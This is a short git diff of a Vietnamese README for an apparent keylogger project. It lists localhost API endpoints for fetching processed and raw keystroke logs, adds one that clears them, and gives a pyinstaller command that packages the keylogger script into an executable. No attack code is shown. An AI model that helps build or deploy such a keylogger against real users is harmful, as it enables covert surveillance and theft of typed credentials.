@@ -27,6 +27,8 @@ API để lấy logs: http://localhost:5000/api/logs
 
 API để lấy raw logs (logs chưa được xử lí): http://localhost:5000/api/rawlogs
 
+API để clear logs: http://localhost:5000/api/flush_logs
+
 ### Executable
 > pyinstaller clientapp\keylogger.py
 _#pip install pyinstaller_
